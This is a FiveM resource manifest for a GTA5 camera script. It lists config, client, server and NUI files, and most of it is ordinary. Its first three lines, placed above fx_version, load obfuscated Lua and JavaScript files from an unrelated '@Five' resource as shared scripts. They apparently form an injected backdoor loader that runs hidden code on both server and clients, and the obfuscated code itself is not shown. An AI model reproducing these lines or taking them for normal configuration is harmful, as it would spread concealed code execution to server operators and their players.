shared_script '@Five/ai_module_fg-obfuscated.lua'
shared_script '@Five/ai_module_fg-obfuscated.js'
shared_script '@Five/shared_fg-obfuscated.lua'
fx_version 'adamant'

game 'gta5'

author 'Project Sloth Team'

description 'Camera script'

version '1.0.4'

lua54 'yes'

shared_scripts {
    'config.lua',
}

client_scripts {
    'client/cl_*.lua',
    'client/cl_*.js',
}

server_scripts {
    'server/sv_*.lua',
}

ui_page "client/nui/index.html"

files {
	"client/nui/index.html",
    "client/nui/app.js",
    "client/nui/main.css",
}

data_file 'DLC_ITYP_REQUEST' 'stream/ps_camera.ytyp'
